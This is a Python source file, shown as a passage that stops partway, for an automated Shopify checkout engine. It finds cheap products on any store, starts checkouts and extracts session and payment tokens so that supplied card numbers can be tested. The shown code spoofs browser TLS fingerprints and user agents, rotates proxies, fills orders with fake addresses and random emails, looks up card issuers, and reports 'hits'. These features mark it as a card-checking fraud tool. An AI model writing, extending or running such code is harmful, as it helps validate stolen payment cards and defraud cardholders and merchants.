# =============================================================================
# checkout_engine.py — Shopify Checkout Engine (v3.0.0)
# =============================================================================
# Direct Shopify checkout automation. API-less. No external server needed.
# Uses curl_cffi for TLS fingerprint spoofing.
#
# Public API:
#   run_checkout_for_card(shop_url, card_entry, proxy_url, low) -> CheckResult
#   run_checkout_public(shop_url, card, proxy_url, low) -> dict
#   normalize_proxy(raw) -> str
#   parse_card_entry(entry) -> (number, month, year, cvv)
#   is_proxy_alive(proxy_url, timeout) -> bool
#   validate_card_luhn(number) -> bool
#   get_bin_info(bin_prefix) -> dict
#   set_hit_callback(fn) -> None
#   engine_stats() -> dict
#
# Flow:
#   Step 0  — Find cheapest available product on the store
#   Step 1  — Add to cart, start checkout session
#   Step 2  — Acquire private access token
#   Step 3  — Fetch actions JS, extract GraphQL operation IDs
#   Step 4  — Proposal 1 (currency/country negotiation)
#   Step 5  — Proposal 2 (add email)
#   Step 6  — Proposal 3 (add shipping address, country fallback)
#   Step 7  — Proposal 4 (confirm address)
#   Step 8  — Proposal 5 (finalize + PendingTerms wait)
#   Step 9  — PCI tokenization (card → session ID)
#   Step 10 — SubmitForCompletion (payment attempt)
#   Step 11 — Poll for receipt (CHARGED/APPROVED/DECLINED)
# =============================================================================

import json
import os
import random
import re
import time
import html
import urllib.parse
import threading
import hashlib
from typing import Dict, List, Optional, Tuple, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
from collections import OrderedDict
from datetime import datetime

from curl_cffi.requests import Session
import logging


# ──────────────────────── Logging (optional JSON) ────────────────────

_LOG_JSON = os.environ.get("LOG_JSON", "false").lower() == "true"


class _JsonFormatter(logging.Formatter):
    def format(self, record):
        p = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "level": record.levelname,
            "logger": record.name,
            "msg": record.getMessage(),
        }
        if record.exc_info:
            p["exc"] = self.formatException(record.exc_info)
        return json.dumps(p, ensure_ascii=False)


_handler = logging.StreamHandler()
_handler.setFormatter(
    _JsonFormatter() if _LOG_JSON else
    logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
)
logging.basicConfig(level=logging.INFO, handlers=[_handler])
logger = logging.getLogger("checkout")


# ──────────────────────── Redaction ──────────────────────────────────

_REDACT_PATTERNS = [
    (re.compile(r'(\b\d{12,19}\b)'), lambda m: "****" + m.group(1)[-4:]),
    (re.compile(r'("sessionToken"\s*:\s*")([^"]{6})[^"]+'), r'\1\2…'),
    (re.compile(r'("sessionId"\s*:\s*")([^"]{6})[^"]+'),    r'\1\2…'),
    (re.compile(r'("receiptId"\s*:\s*")([^"]{6})[^"]+'),    r'\1\2…'),
    (re.compile(r'("queueToken"\s*:\s*")([^"]{6})[^"]+'),   r'\1\2…'),
]


def _redact(s: str) -> str:
    if not s:
        return s
    out = s
    for pat, repl in _REDACT_PATTERNS:
        try:
            out = pat.sub(repl, out)
        except Exception:
            pass
    return out


# ──────────────────────── Config ─────────────────────────────────────

VERSION = "3.0.0"

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110",
                    "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

PROXY_POOL: List[str] = []
_GLOBAL_SEM = threading.Semaphore(int(os.environ.get("SHOPIFY_CONCURRENCY", "4")))

SESSION_DIR = os.environ.get("SESSION_DIR", ".sessions")
os.makedirs(SESSION_DIR, exist_ok=True)

_HIT_CALLBACK: Optional[Callable[[dict], None]] = None


# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


class HardDecline(Exception):
    pass


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False
    duration_ms: int = 0
    stage_timings: Dict[str, int] = field(default_factory=dict)


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james", "anderson", "428 W 45th St", "Apt 4B", "New York", "US", "NY", "10036", "+12125550100"),
    "CA": Address("john", "smith", "200 Kent St", "", "Ottawa", "CA", "ON", "K1A 0G9", "+16135550100"),
    "GB": Address("james", "wilson", "10 Downing St", "", "London", "GB", "ENG", "SW1A 2AA", "+442012345678"),
    "AU": Address("thomas", "taylor", "1 George St", "", "Sydney", "AU", "NSW", "2000", "+61212345678"),
    "DE": Address("lucas", "thomas", "Friedrichstr 100", "", "Berlin", "DE", "BE", "10117", "+493012345678"),
    "FR": Address("hugo", "bernard", "10 Rue de Rivoli", "", "Paris", "FR", "IDF", "75001", "+33112345678"),
    "IN": Address("rahul", "sharma", "221B Linking Rd", "", "Mumbai", "IN", "MH", "400001", "+919876543210"),
    "AE": Address("ahmed", "almansouri", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "12345", "+97141234567"),
    "IE": Address("sean", "murphy", "1 Grafton St", "", "Dublin", "IE", "D", "D02Y006", "+35311234567"),
    "NL": Address("bas", "jansen", "Dam 1", "", "Amsterdam", "NL", "NH", "1012JS", "+31201234567"),
    "NZ": Address("jack", "wilson", "1 Queen St", "", "Auckland", "NZ", "AUK", "1010", "+6491234567"),
    "JP": Address("takashi", "yamamoto", "1-1-1 Marunouchi", "", "Tokyo", "JP", "13", "1000005", "+81312345678"),
    "SG": Address("wei", "tan", "1 Raffles Place", "#01-01", "Singapore", "SG", "01", "048616", "+6561234567"),
    "HK": Address("chun", "wong", "88 Nathan Road", "Flat 5A", "Kowloon", "HK", "KLN", "999077", "+85255555555"),
    "CH": Address("hans", "weber", "Bahnhofstrasse 1", "", "Zurich", "CH", "ZH", "8001", "+41441234567"),
    "SE": Address("erik", "andersson", "Vasagatan 1", "", "Stockholm", "SE", "AB", "111 20", "+468123456"),
    "NO": Address("olav", "hansen", "Karl Johans gate 1", "", "Oslo", "NO", "03", "0154", "+4721234567"),
    "DK": Address("lars", "nielsen", "Strøget 1", "", "Copenhagen", "DK", "84", "1457", "+4531234567"),
    "FI": Address("jussi", "korhonen", "Mannerheimintie 1", "", "Helsinki", "FI", "18", "00100", "+35891234567"),
    "BE": Address("jan", "peeters", "Grote Markt 1", "", "Brussels", "BE", "BRU", "1000", "+3221234567"),
    "AT": Address("markus", "gruber", "Stephansplatz 1", "", "Vienna", "AT", "9", "1010", "+4312345678"),
    "IT": Address("marco", "rossi", "Via Roma 1", "", "Rome", "IT", "RM", "00184", "+39061234567"),
    "ES": Address("carlos", "garcia", "Calle Mayor 1", "", "Madrid", "ES", "M", "28013", "+34912345678"),
    "PL": Address("jakub", "nowak", "ul. Marszałkowska 1", "", "Warszawa", "PL", "MZ", "00-001", "+48221234567"),
}

SHIPPING_FALLBACK_ORDER = ["US", "CA", "GB", "AU", "DE", "FR", "NL", "IE", "NZ", "SG", "JP"]

EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com",
                 "icloud.com", "aol.com", "mail.com", "yandex.com", "proton.me"]
FIRST_NAMES = ["james", "john", "robert", "michael", "william", "david", "richard", "joseph",
               "thomas", "charles", "mary", "patricia", "jennifer", "linda", "elizabeth"]
LAST_NAMES = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
              "rodriguez", "martinez", "anderson", "taylor", "thomas", "moore", "jackson"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    c = (country or "").upper()
    if c in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[c]
    if "-" in c:
        base = c.split("-")[0]
        if base in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]


def pick_address_for_store(shop_url: str, currency: str = "USD", country_hint: str = "") -> Address:
    CURRENCY_TO_COUNTRY = {
        "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU",
        "EUR": "DE", "INR": "IN", "AED": "AE", "CHF": "CH",
        "HKD": "HK", "NZD": "NZ", "SGD": "SG", "JPY": "JP",
    }
    tld = (urllib.parse.urlparse(shop_url).hostname or "").split(".")[-1].upper()
    TLD_MAP = {
        "US": "US", "CA": "CA", "UK": "GB", "AU": "AU", "DE": "DE",
        "FR": "FR", "IN": "IN", "AE": "AE", "NZ": "NZ", "IE": "IE",
        "NL": "NL", "JP": "JP", "SG": "SG", "HK": "HK", "CH": "CH",
    }
    for candidate in (TLD_MAP.get(tld, ""), CURRENCY_TO_COUNTRY.get(currency.upper(), ""),
                      country_hint.upper(), "US"):
        if candidate and candidate in COUNTRY_ADDRESSES:
            return COUNTRY_ADDRESSES[candidate]
    return COUNTRY_ADDRESSES["US"]


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    return [COUNTRY_ADDRESSES[c] for c in SHIPPING_FALLBACK_ORDER
            if c.upper() != exclude_country.upper() and c in COUNTRY_ADDRESSES]


# ──────────────────────── Card validation ────────────────────────────

def validate_card_luhn(number: str) -> bool:
    """Luhn checksum validation."""
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
    except ValueError:
        return False
    if len(digits) < 12:
        return False
    checksum = 0
    parity = len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0


def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    parts = card_entry.strip().split('|')
    if len(parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        month = int(parts[1]); year = int(parts[2])
    except ValueError as e:
        raise Exception(f"invalid month/year: {e}")
    return parts[0], month, year, parts[3]


# ──────────────────────── BIN cache (LRU + TTL) ──────────────────────

class _BinCache:
    def __init__(self, maxsize: int = 2000, ttl: int = 86400):
        self._cache: OrderedDict[str, Tuple[float, dict]] = OrderedDict()
        self._lock = threading.Lock()
        self._maxsize = maxsize
        self._ttl = ttl

    def get(self, key: str) -> Optional[dict]:
        with self._lock:
            entry = self._cache.get(key)
            if not entry:
                return None
            ts, val = entry
            if time.time() - ts > self._ttl:
                del self._cache[key]
                return None
            self._cache.move_to_end(key)
            return val

    def put(self, key: str, val: dict):
        with self._lock:
            self._cache[key] = (time.time(), val)
            self._cache.move_to_end(key)
            while len(self._cache) > self._maxsize:
                self._cache.popitem(last=False)

    def stats(self) -> dict:
        with self._lock:
            return {"size": len(self._cache), "maxsize": self._maxsize}


_BIN_CACHE = _BinCache()


async def get_bin_info_async(bin_prefix: str) -> dict:
    """Async BIN lookup with cache."""
    bin6 = (bin_prefix or "")[:6]
    if len(bin6) < 6 or not bin6.isdigit():
        return {"brand": "-", "type": "-", "level": "-", "bank": "-",
                "country": "-", "flag": "", "cached": False}

    cached = _BIN_CACHE.get(bin6)
    if cached:
        cached["cached"] = True
        return cached

    result = {"brand": "-", "type": "-", "level": "-", "bank": "-",
              "country": "-", "flag": "", "cached": False}

    try:
        import asyncio
        import aiohttp
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://lookup.binlist.net/{bin6}",
                             headers={"Accept-Version": "3"},
                             timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    result["brand"] = (data.get("scheme") or "-").upper()
                    result["type"] = (data.get("type") or "-").upper()
                    result["level"] = (data.get("brand") or "-").upper()
                    result["bank"] = ((data.get("bank") or {}).get("name") or "-")
                    result["country"] = ((data.get("country") or {}).get("name") or "-")
                    result["flag"] = ((data.get("country") or {}).get("emoji") or "")
    except Exception as e:
        logger.debug(f"BIN lookup failed for {bin6}: {e!r}")

    _BIN_CACHE.put(bin6, result)
    return result


def get_bin_info(bin_prefix: str) -> dict:
    """Sync BIN lookup wrapper (for bot integration)."""
    bin6 = (bin_prefix or "")[:6]
    if len(bin6) < 6 or not bin6.isdigit():
        return {"brand": "-", "type": "-", "level": "-", "bank": "-",
                "country": "-", "flag": "", "cached": False}
    cached = _BIN_CACHE.get(bin6)
    if cached:
        cached["cached"] = True
        return cached

    result = {"brand": "-", "type": "-", "level": "-", "bank": "-",
              "country": "-", "flag": "", "cached": False}
    try:
        with Session(impersonate="chrome124", timeout=10) as s:
            r = s.get(f"https://lookup.binlist.net/{bin6}",
                      headers={"Accept-Version": "3"})
            if r.status_code == 200:
                data = r.json()
                result["brand"] = (data.get("scheme") or "-").upper()
                result["type"] = (data.get("type") or "-").upper()
                result["level"] = (data.get("brand") or "-").upper()
                result["bank"] = ((data.get("bank") or {}).get("name") or "-")
                result["country"] = ((data.get("country") or {}).get("name") or "-")
                result["flag"] = ((data.get("country") or {}).get("emoji") or "")
    except Exception as e:
        logger.debug(f"BIN lookup failed for {bin6}: {e!r}")

    _BIN_CACHE.put(bin6, result)
    return result


# ──────────────────────── Circuit breaker ────────────────────────────

class _CircuitBreaker:
    def __init__(self, threshold: int = 5, cooldown: int = 300):
        self._failures: Dict[str, int] = {}
        self._open_until: Dict[str, float] = {}
        self._lock = threading.Lock()
        self._threshold = threshold
        self._cooldown = cooldown

    def is_open(self, domain: str) -> bool:
        with self._lock:
            until = self._open_until.get(domain, 0)
            if time.time() < until:
                return True
            if until > 0:
                self._open_until.pop(domain, None)
                self._failures.pop(domain, None)
            return False

    def record_failure(self, domain: str):
        with self._lock:
            self._failures[domain] = self._failures.get(domain, 0) + 1
            if self._failures[domain] >= self._threshold:
                self._open_until[domain] = time.time() + self._cooldown
                logger.warning(f"circuit open for {domain}")

    def record_success(self, domain: str):
        with self._lock:
            self._failures.pop(domain, None)

    def stats(self) -> dict:
        with self._lock:
            return {"failures": dict(self._failures),
                    "open_until": dict(self._open_until)}


_BREAKER = _CircuitBreaker()


# ──────────────────────── Adaptive rate limiter ──────────────────────

class _RateLimiter:
    """Per-domain token bucket. Honors 429 Retry-After."""
    def __init__(self, rate: float = 5.0, burst: int = 10):
        self._rate = rate
        self._burst = burst
        self._tokens: Dict[str, float] = {}
        self._last: Dict[str, float] = {}
        self._lock = threading.Lock()

    def acquire(self, domain: str, timeout: float = 30.0) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            with self._lock:
                now = time.time()
                last = self._last.get(domain, now)
                tokens = min(self._burst,
                             self._tokens.get(domain, self._burst) +
                             (now - last) * self._rate)
                self._last[domain] = now
                if tokens >= 1.0:
                    self._tokens[domain] = tokens - 1.0
                    return True
                self._tokens[domain] = tokens
                wait = (1.0 - tokens) / self._rate
            time.sleep(min(wait, 0.5))
        return False

    def penalize(self, domain: str, seconds: float):
        with self._lock:
            self._tokens[domain] = 0.0
            self._last[domain] = time.time() + seconds


_RATE_LIMITER = _RateLimiter(rate=4.0, burst=8)


# ──────────────────────── Retry with jitter ──────────────────────────

def _retry_sleep(attempt: int, base: float = 1.0, cap: float = 30.0):
    delay = min(cap, base * (2 ** (attempt - 1)))
    time.sleep(random.uniform(0, delay))


# ──────────────────────── Session persistence ────────────────────────

def _session_save(token: str, data: dict):
    try:
        path = os.path.join(SESSION_DIR, f"{token}.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception as e:
        logger.debug(f"session save failed: {e!r}")


def _session_load(token: str) -> Optional[dict]:
    try:
        path = os.path.join(SESSION_DIR, f"{token}.json")
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


# ──────────────────────── Proxy helpers ──────────────────────────────

def normalize_proxy(raw: str) -> str:
    if not raw or not raw.strip():
        raise Exception("empty proxy")
    p = raw.strip()
    for prefix in ("/addproxy", "addproxy", "/proxy", "proxy"):
        if p.lower().startswith(prefix + " "):
            p = p[len(prefix):].strip()
            break
        if p.lower() == prefix:
            raise Exception("empty proxy (command only)")
    p = p.split()[0] if p else ""
    if not p:
        raise Exception("empty proxy after parsing")
    if "://" in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.hostname or not parsed.port:
            raise Exception(f"invalid proxy URL: {raw!r}")
        return p
    if "@" in p:
        return "http://" + p
    parts = p.split(":")
    if len(parts) == 2:
        host, port = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pw = parts
        if not host or not port.isdigit():
            raise Exception(f"invalid proxy: {raw!r}")
        return f"http://{user}:{pw}@{host}:{port}"
    raise Exception(f"unsupported proxy format: {raw!r}")


def parse_proxy_format(proxy: str) -> Optional[dict]:
    proxy = proxy.strip()
    pt = 'http'
    m = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if m:
        pt, proxy = m.group(1).lower(), m.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        try:
            if 0 < int(pp) <= 65535:
                h, p, u, pw = ph, pp, pu, ppw
        except Exception:
            return None
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except Exception:
        return None
    return {'ip': h, 'port': p, 'username': u or None,
            'password': pw or None, 'type': pt}


def proxy_to_url(proxy: str) -> str:
    p = parse_proxy_format(proxy)
    if not p:
        return f'http://{proxy}'
    if p['username'] and p['password']:
        return f"{p['type']}://{p['username']}:{p['password']}@{p['ip']}:{p['port']}"
    return f"{p['type']}://{p['ip']}:{p['port']}"


def _strip_country_from_proxy(proxy_line: str) -> str:
    if not proxy_line:
        return proxy_line
    p = proxy_line.strip()
    m = re.match(r'^([A-Z]{2}):(.+)$', p)
    if m and len(m.group(1)) == 2:
        return m.group(2)
    return p


_PROXY_HEALTH_CACHE: Dict[str, float] = {}
_PROXY_HEALTH_LOCK = threading.Lock()
_PROXY_HEALTH_TTL_LIVE = 300
_PROXY_HEALTH_TTL_DEAD = 60


def is_proxy_alive(proxy_url: str, timeout: float = 6.0) -> bool:
    if not proxy_url:
        return True
    now = time.time()
    with _PROXY_HEALTH_LOCK:
        cached = _PROXY_HEALTH_CACHE.get(proxy_url)
        if cached is not None:
            age = abs(now - abs(cached))
            ttl = _PROXY_HEALTH_TTL_LIVE if cached > 0 else _PROXY_HEALTH_TTL_DEAD
            if age < ttl:
                return cached > 0

    alive = False
    try:
        with Session(proxy=proxy_url, impersonate="chrome124", timeout=timeout) as s:
            r = s.head("https://cdn.shopify.com/", timeout=timeout)
            alive = 200 <= r.status_code < 500
    except Exception as e:
        logger.debug(f"proxy check failed {proxy_url[:40]}: {e!r}")

    with _PROXY_HEALTH_LOCK:
        _PROXY_HEALTH_CACHE[proxy_url] = now if alive else -now
    return alive


def _load_proxy_pool_from_env():
    raw = os.environ.get("PROXY_POOL", "").strip()
    if not raw:
        return
    for entry in raw.split(","):
        entry = entry.strip()
        if not entry:
            continue
        try:
            PROXY_POOL.append(normalize_proxy(entry))
        except Exception as e:
            logger.warning(f"PROXY_POOL skip {entry!r}: {e}")


# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent = user_agent
        kwargs = {"impersonate": impersonate, "timeout": timeout}
        if self.proxy_url:
            kwargs["proxy"] = self.proxy_url
        self.session = Session(**kwargs)
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        })

    def _domain(self, url: str) -> str:
        try:
            return urllib.parse.urlparse(url).hostname or url
        except Exception:
            return url

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        domain = self._domain(url)
        _RATE_LIMITER.acquire(domain)
        with _GLOBAL_SEM:
            r = self.session.get(url, **kwargs)
        if r.status_code == 429:
            ra = r.headers.get("Retry-After", "20")
            try:
                secs = float(ra)
            except ValueError:
                secs = 20.0
            _RATE_LIMITER.penalize(domain, secs)
        return r

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        domain = self._domain(url)
        _RATE_LIMITER.acquire(domain)
        with _GLOBAL_SEM:
            r = self.session.post(url, data=data, json=json, **kwargs)
        if r.status_code == 429:
            ra = r.headers.get("Retry-After", "20")
            try:
                secs = float(ra)
            except ValueError:
                secs = 20.0
            _RATE_LIMITER.penalize(domain, secs)
        return r

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass

    def __enter__(self): return self
    def __exit__(self, *a): self.close()


# ──────────────────────── Step 0: cheapest product ───────────────────

_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()


def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent]
        pick = random.choice(preferred) if preferred else random.choice(candidates)
        _recent_prices[domain] = (list(recent) + [pick["price"]])[-5:]
    return pick


def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50,
                          max_price: float = 5.00) -> Tuple[str, str, str, str]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {500, 502, 503, 504}
    resp = None
    last_err: Optional[Exception] = None

    for attempt in range(1, 5):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            logger.warning(f"products.json attempt {attempt}/4 net error: {exc!r}")
            if attempt < 4:
                _retry_sleep(attempt)
            continue

        if resp.status_code == 200:
            break
        if resp.status_code == 429:
            _retry_sleep(attempt, base=15)
            last_err = Exception("HTTP 429")
            continue
        if resp.status_code in _RETRYABLE:
            last_err = Exception(f"HTTP {resp.status_code}")
            _retry_sleep(attempt)
            continue

        raise Exception(f"products.json returned {resp.status_code}")
    else:
        raise Exception(f"products.json failed after 4 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")

    try:
        products = resp.json().get("products", [])
    except Exception as exc:
        raise Exception(f"products.json: invalid JSON ({exc})")

    if not products:
        raise Exception("No products returned")

    in_range: List[Dict] = []
    fallback: List[Dict] = []

    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0:
                continue
            try:
                price_f = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price_f < min_price:
                continue
            entry = {
                "variant_id": str(v["id"]),
                "product_id": str(p["id"]),
                "title": p.get("title", ""),
                "price": v.get("price", ""),
                "price_f": price_f,
            }
            if price_f <= max_price:
                in_range.append(entry)
            fallback.append(entry)

    fallback.sort(key=lambda x: x["price_f"])
    candidates = in_range if in_range else fallback
    if not candidates:
        raise Exception(f"No available products above ${min_price:.2f}")

    pick = _shuffle_pick_variant(candidates, domain)
    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"]


def find_cheapest_product_parallel(shop_urls: List[str], max_price: float = 5.00,
                                   max_workers: int = 4) -> Tuple[str, str, str, str]:
    """Race multiple Shopify stores, return first successful fetch."""
    import concurrent.futures as cf
    if not shop_urls:
        raise Exception("no sites provided")

    def _try_one(url):
        try:
            with TLSClient(timeout=15) as cl:
                return find_cheapest_product(cl, url, max_price=max_price)
        except Exception as e:
            return e

    with cf.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = [ex.submit(_try_one, u) for u in shop_urls]
        for fut in cf.as_completed(futs):
            res = fut.result()
            if not isinstance(res, Exception):
                return res

    raise Exception("all sites failed")


# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp = client.get(cart_permalink, allow_redirects=True, headers={
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "referer": shop_url + "/",
        "sec-ch-ua": '"Chromium";v="124", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    })
    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text
    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    if not checkout_url or "/checkouts/" not in checkout_url:
        raise Exception(f"no checkout redirect (final={checkout_url!r})")

    return checkout_url, checkout_token, session_token, checkout_html


# ──────────────────────── Extractors ─────────────────────────────────

def extract_private_access_token_id(html_text: str) -> str:
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"',
                  html.unescape(html_text))
    return m.group(1) if m else ""


def extract_stable_id(html_text: str) -> str:
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', html.unescape(html_text))
    return m.group(1) if m else ""


def extract_commit_sha(html_text: str) -> str:
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(html_text))
    return m.group(1) if m else ""


def extract_source_token(html_text: str) -> str:
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', html_text)
    return html.unescape(m.group(1)).strip('"') if m else ""


def extract_identification_signature(html_text: str) -> str:
    decoded = html_text.replace('&quot;', '"')
    for pat in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, decoded)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(html_text: str) -> str:
    decoded = html_text.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    return m.group(1) if m else ""


def extract_vault_domain(html_text: str) -> str:
    decoded = html_text.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    return m.group(1) if m else ""


def extract_queue_token(body: str) -> str:
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def extract_actions_js_url(html_text: str, shop_url: str) -> str:
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', html_text)
    return shop_url + m.group(1) if m else ""


def extract_proposal_id(js: str) -> str:
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
    return m.group(1) if m else ""


def extract_submit_id(js: str) -> str:
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
    return m.group(1) if m else ""


def extract_poll_id(js: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        m = re.search(p, js)
        if m:
            return m.group(1)
    return ""


def extract_receipt_id(body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', body)
    return m.group(1) if m else ""


def extract_receipt_session_token(body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


